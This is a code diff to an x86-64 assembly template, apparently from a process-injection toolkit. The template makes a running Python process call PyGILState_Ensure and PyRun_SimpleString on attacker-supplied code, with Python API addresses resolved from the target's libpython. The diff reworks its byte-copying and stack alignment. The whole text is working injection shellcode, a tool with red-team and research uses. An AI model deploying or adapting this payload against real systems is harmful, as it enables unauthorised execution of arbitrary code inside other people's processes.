@@ -1,13 +1,11 @@
 jmp execute_python_code_main
-// import reusable code fragments 
-[FRAGMENT:asminject_copy_bytes.s:FRAGMENT]
 
 execute_python_code_main:
 
 	# // BEGIN: call Py_Initialize()
-	# push r14
+	# [DISABLED_INLINE:stack_align-r8-pre.s:DISABLED_INLINE]
 	# mov rbx, [SYMBOL_ADDRESS:Py_Initialize:IN_BINARY:.+/(lib|)python[0-9\.so]+$:SYMBOL_ADDRESS]
-	# pop r14
+	# [DISABLED_INLINE:stack_align-r8-post.s:DISABLED_INLINE]
 	# // END: call Py_Initialize()
 	
 	// copy the Python string to arbitrary read/write memory
@@ -17,13 +15,12 @@ execute_python_code_main:
 	push rcx
 	mov rcx, [VARIABLE:pythoncode.length:VARIABLE]
 	add rcx, 2												# null terminator
-	#rep movsb
-	call asminject_copy_bytes
+	rep movsb
 	pop rcx
 	// END: copy the Python string to arbitrary read/write memory
 
 	// BEGIN: call PyGILState_Ensure() and store the handle it returns
-	//push r14
+	[INLINE:stack_align-r8-pre.s:INLINE]
 	xor rax, rax
 	xor rdi, rdi
 	xor rsi, rsi
@@ -31,41 +28,39 @@ execute_python_code_main:
 	call rbx
 	mov rbx, arbitrary_read_write_data_address[rip]
 	mov [rbx], rax
-	//pop r14
+	[INLINE:stack_align-r8-post.s:INLINE]
 	// END: call PyGILState_Ensure()
 
-	// BEGIN: call PyRun_SimpleString("arbitrary Python code here")
-	//push r14
+	// BEGIN: call PyRun_SimpleString("arbitrary Python code here")	
 	push rcx
+	[INLINE:stack_align-r8-pre.s:INLINE]
 	xor rsi, rsi
 	mov rdi, arbitrary_read_write_data_address[rip]
 	add rdi, 32
 	xor rcx, rcx
 	mov rbx, [SYMBOL_ADDRESS:PyRun_SimpleStringFlags:IN_BINARY:.+/(lib|)python[0-9\.so]+$:SYMBOL_ADDRESS]
 	call rbx
+	[INLINE:stack_align-r8-post.s:INLINE]
 	pop rcx
-	//pop r14
 	// END: call PyRun_SimpleString("arbitrary Python code here")
 	
 	// BEGIN: call PyGILState_Release(handle)
-	//push r14
+	[INLINE:stack_align-r8-pre.s:INLINE]
 	mov rbx, arbitrary_read_write_data_address[rip]
 	mov rdi, [rbx]
-	//mov rax, [rbx]
-	//mov rdi, rax
 	xor rsi, rsi
 	mov rbx, [SYMBOL_ADDRESS:PyGILState_Release:IN_BINARY:.+/(lib|)python[0-9\.so]+$:SYMBOL_ADDRESS]
 	call rbx
-	//pop r14
+	[INLINE:stack_align-r8-post.s:INLINE]
 	// END: call PyGILState_Release(handle)
 	
 	# // BEGIN: call Py_Finalize()
-	# push r14
+	# [DISABLED_INLINE:stack_align-r8-pre.s:DISABLED_INLINE]
 	# mov rax, 0
 	# mov rdi, rax
 	# mov rbx, [SYMBOL_ADDRESS:Py_Finalize:IN_BINARY:.+/(lib|)python[0-9\.so]+$:SYMBOL_ADDRESS]
 	# call rbx
-	# pop r14
+	# [DISABLED_INLINE:stack_align-r8-post.s:DISABLED_INLINE]
 	# // END: call Py_Finalize()
 
 SHELLCODE_SECTION_DELIMITER
